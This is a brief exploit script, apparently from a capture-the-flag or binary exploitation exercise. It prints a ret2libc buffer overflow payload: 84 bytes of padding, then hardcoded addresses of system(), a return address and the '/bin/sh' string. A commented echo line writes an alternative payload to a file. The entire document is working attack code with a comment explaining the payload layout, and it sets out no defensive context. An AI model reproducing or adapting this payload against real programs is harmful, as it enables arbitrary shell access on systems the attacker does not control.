# 0x 7f ff f7 f6 b6 98
# 0x 7f ff f7 de 3d 60
# 0x 7f ff f7 dd 85 f0
print("2\n"  + "a"*84 + "\x60\x3d\xde\xf7\xff\x7f" + "\xf0\x85\xdd\xf7\xff\x7f" +  "\x98\xb6\xf6\xf7\xff\x7f")
# print("2\n"  + "A"*55 + "\x98\xb6\xf6\xf7\xff\x7f" )

# echo -n -e "2\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x98\xb6\xf6\xf7\xff\x7f" > payload2 

# options
# payload = A*84 + address of system() + return address for system() + address of "/bin/sh"